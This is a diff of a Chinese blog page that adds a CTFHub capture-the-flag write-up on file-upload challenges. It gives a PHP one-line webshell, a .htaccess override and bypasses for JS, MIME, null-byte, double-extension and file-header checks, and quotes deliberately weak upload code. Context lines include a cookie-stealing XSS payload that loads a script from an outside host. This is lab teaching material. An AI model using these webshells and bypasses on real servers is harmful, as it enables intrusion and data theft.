@@ -520,21 +520,21 @@ HTTP是Hyper Text Transfer">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-07-30
+                    2020-07-31
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    7.6k
+                    9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    32 分
+                    38 分
                 </div>
                 
 				
@@ -1049,6 +1049,107 @@ Referer: <span class="token operator">-</span><span class="token number">1</span
 <pre class="line-numbers language-js"><code class="language-js">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>challenge<span class="token operator">-</span>187067f754440341<span class="token punctuation">.</span>sandbox<span class="token punctuation">.</span>ctfhub<span class="token punctuation">.</span>com<span class="token punctuation">:</span><span class="token number">10080</span><span class="token operator">/</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token operator">&lt;</span>script src<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xss<span class="token punctuation">.</span>fbisb<span class="token punctuation">.</span>com<span class="token operator">/</span>ij7V<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>在XSS平台中获取到的Cookie中获取到flag</p>
 <p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200728085238.png" alt></p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h3><p>进入题目显示无限制的上传，直接上传一句话木马<code>&lt;?php eval($_POST[&#39;cmd&#39;]); ?&gt;</code>，蚁剑连接，找到flag</p>
+<h3 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h3><p>该题目提示为JS前端验证，前端JS代码会对文件后缀进行一次验证</p>
+<p><strong>解题思路:</strong></p>
+<p>方法1：修改<code>JS</code>，直接将<code>php</code>后缀名加上，在控制台运行，然后就可以成功上传php文件了</p>
+<p>方法2：浏览器禁用<code>JavaScript</code>，JS不会验证文件后缀名，就可以直接上传了</p>
+<p>方法3：BurpSuite抓包，先上传白名单文件(将带有一句话木马php文件的后缀名先改成png)，再用burp抓包后修改回文件后缀为php</p>
+<p>成功上传文件后，利用蚁剑连接获取flag即可</p>
+<h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><blockquote>
+<p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
+<p>简单来说，就是我上传了一个.htaccess文件到服务器，那么服务器之后就会将特定格式的文件以php格式解析。</p>
+</blockquote>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"php7"</span><span class="token punctuation">,</span> <span class="token string">"php5"</span><span class="token punctuation">,</span> <span class="token string">"php4"</span><span class="token punctuation">,</span> <span class="token string">"php3"</span><span class="token punctuation">,</span> <span class="token string">"phtml"</span><span class="token punctuation">,</span> <span class="token string">"pht"</span><span class="token punctuation">,</span> <span class="token string">"jsp"</span><span class="token punctuation">,</span> <span class="token string">"jspa"</span><span class="token punctuation">,</span> <span class="token string">"jspx"</span><span class="token punctuation">,</span> <span class="token string">"jsw"</span><span class="token punctuation">,</span> <span class="token string">"jsv"</span><span class="token punctuation">,</span> <span class="token string">"jspf"</span><span class="token punctuation">,</span> <span class="token string">"jtml"</span><span class="token punctuation">,</span> <span class="token string">"asp"</span><span class="token punctuation">,</span> <span class="token string">"aspx"</span><span class="token punctuation">,</span> <span class="token string">"asa"</span><span class="token punctuation">,</span> <span class="token string">"asax"</span><span class="token punctuation">,</span> <span class="token string">"ascx"</span><span class="token punctuation">,</span> <span class="token string">"ashx"</span><span class="token punctuation">,</span> <span class="token string">"asmx"</span><span class="token punctuation">,</span> <span class="token string">"cer"</span><span class="token punctuation">,</span> <span class="token string">"swf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$blacklist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('上传成功')&lt;/script>"</span><span class="token punctuation">;</span>
+            <span class="token keyword">echo</span> <span class="token string">"上传文件相对路径&lt;br>"</span> <span class="token punctuation">.</span> <span class="token constant">UPLOAD_URL_PATH</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('上传失败')&lt;/script>"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('文件类型不匹配')&lt;/script>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>查看源码，有很多黑名单，但是.htaccess还是没有过滤</p>
+<p><strong>解题思路：</strong></p>
+<p>构造.htaccess，来让服务器把我们上传的png当作php解析</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FilesMatch</span> <span class="token attr-name">"1.jpg"</span><span class="token punctuation">></span></span></span>
+SetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FilesMatch</span><span class="token punctuation">></span></span></span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>上传<code>.htaccess</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200731130018.png" alt></p>
+<p>上传<code>1.jpg</code>,因为为重写了文件解析规则，1.jpg将会被以php文件执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200731130115.png" alt>然后直接连接蚁剑，即可获得flag</p>
+<table>
+<thead>
+<tr>
+<th>连接中国蚁剑</th>
+<th>找到flag文件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200731130534.png" alt></td>
+<td><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200731130528.png" alt></td>
+</tr>
+</tbody></table>
+<h3 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h3><blockquote>
+<p>MIME原本是指多用途互联网邮件扩展类型。后来被用到了HTTP的Content-Type字段，称为互联网媒体类型。服务端通过检测HTTP响应包的Content-Type字段，判断上传文件的类型，来检测上传文件是否为黑名单     MIME-Type 相关知识点:<a href="https://www.w3school.com.cn/media/media_mimeref.asp" target="_blank" rel="noopener">链接</a></p>
+</blockquote>
+<p>经测试，本节对数据包的MIME（Content-Type）进行了限定，只允许 image/jpeg、image/png、image/gif 图片内容数据传输。</p>
+<p><strong>解题思路：</strong>修改Content-Type，绕过Content-Type检测</p>
+<p>上传1.php直接抓包，将Content-Type修改成<code>image/jpeg</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200731133140.png" alt></p>
+<p>上传后蚁剑连接，即可获得flag</p>
+<p>当然换一种思路也可以绕过，将恶意文件先修改后缀为白名单上传(例如1.jpg)，Content-Type字段检测是jpg格式，然后再用Burpsuit修改回php后缀，也可以上传成功</p>
+<h3 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h3><blockquote>
+<p>在针对上传文件的检查中，很多应用都是通过判断文件名后缀的方法来验证文件的安全性的，但再某些时候，攻击者通过手动修改上传的POST包，添加%00，来截断某些函数对文件名的判断在许多语言的函数中，%00被认为终止符，当函数碰到%00，就会停止对后面的判断，00截断就是基于这种逻辑漏洞来绕过检测。</p>
+<p>%00，0x00，/00都属于00截断</p>
+</blockquote>
+<p>1.PHP 版本 &lt; 5.3.4<br>2.php.ini 中 magic_quotes_gpc=off<br>满足上面的条件的时候php就是把%00当成结束符，后面的数据直接忽略</p>
+<p>查看源码</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"jpg"</span><span class="token punctuation">,</span> <span class="token string">"png"</span><span class="token punctuation">,</span> <span class="token string">"gif"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$des</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'road'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"/"</span> <span class="token punctuation">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"."</span> <span class="token punctuation">.</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$des</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('上传成功')&lt;/script>"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('上传失败')&lt;/script>"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"文件类型不匹配"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>设置了一个白名单，只允许<code>jpg</code>, <code>png</code>, <code>gif</code>后缀，然后重新命名上传的文件，并转移到road参数传入的路径可以看到，des是最终的文件名，由$_GET[‘road’]，/，随机数，日期，后缀名组成。</p>
+<p>其中GET参数road是可控的，所以可以通过%00截断，达到<code>$des = $_GET[&#39;road&#39;]</code>的效果</p>
+<p><strong>解题思路：</strong></p>
+<p>先上传一个一句话木马的1.jpg，然后抓包，抓包后将road参数改为/var/www/html/upload/1.php%00</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200731140546.png" alt></p>
+<p>上传后蚁剑连接，即可获得flag</p>
+<h3 id="双写后缀"><a href="#双写后缀" class="headerlink" title="双写后缀"></a>双写后缀</h3><p>查看源码</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"php5"</span><span class="token punctuation">,</span> <span class="token string">"php4"</span><span class="token punctuation">,</span> <span class="token string">"php3"</span><span class="token punctuation">,</span> <span class="token string">"phtml"</span><span class="token punctuation">,</span> <span class="token string">"pht"</span><span class="token punctuation">,</span> <span class="token string">"jsp"</span><span class="token punctuation">,</span> <span class="token string">"jspa"</span><span class="token punctuation">,</span> <span class="token string">"jspx"</span><span class="token punctuation">,</span> <span class="token string">"jsw"</span><span class="token punctuation">,</span> <span class="token string">"jsv"</span><span class="token punctuation">,</span> <span class="token string">"jspf"</span><span class="token punctuation">,</span> <span class="token string">"jtml"</span><span class="token punctuation">,</span> <span class="token string">"asp"</span><span class="token punctuation">,</span> <span class="token string">"aspx"</span><span class="token punctuation">,</span> <span class="token string">"asa"</span><span class="token punctuation">,</span> <span class="token string">"asax"</span><span class="token punctuation">,</span> <span class="token string">"ascx"</span><span class="token punctuation">,</span> <span class="token string">"ashx"</span><span class="token punctuation">,</span> <span class="token string">"asmx"</span><span class="token punctuation">,</span> <span class="token string">"cer"</span><span class="token punctuation">,</span> <span class="token string">"swf"</span><span class="token punctuation">,</span> <span class="token string">"htaccess"</span><span class="token punctuation">,</span> <span class="token string">"ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$blacklist</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>黑名单检测，<code>$name = str_ireplace($blacklist, &quot;&quot;, $name);</code>将文件名中含有黑名单字段的替换为空</p>
+<p>解题思路：利用burp抓包，对php进行双写</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200731142319.png" alt></p>
+<p>上传后蚁剑连接，即可获得flag</p>
+<h3 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h3><p>上传一些文件测试一哈</p>
+<pre><code>1.png             上传成功
+1.php             文件类型不正确, 只允许上传 jpeg jpg png gif 类型的文件
+1.php+修改MIME     文件错误</code></pre><p>绕过了后缀，但是还是绕不开检测，那应该就是对文件内容检测了。</p>
+<p><strong>解题思路：</strong></p>
+<p>方法1：制作图片马，上传后抓包，再修改为php后缀发包，再蚁剑连接</p>
+<p>方法2：上传一句话木马的1.png，然后抓包，最后在一句话前插入png/gif/jpg文件头，再发包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200731144750.png" alt></p>
 <h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -2181,7 +2282,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">173.4k</span>&nbsp;字
+                class="white-color">177.9k</span>&nbsp;字
             
             
             
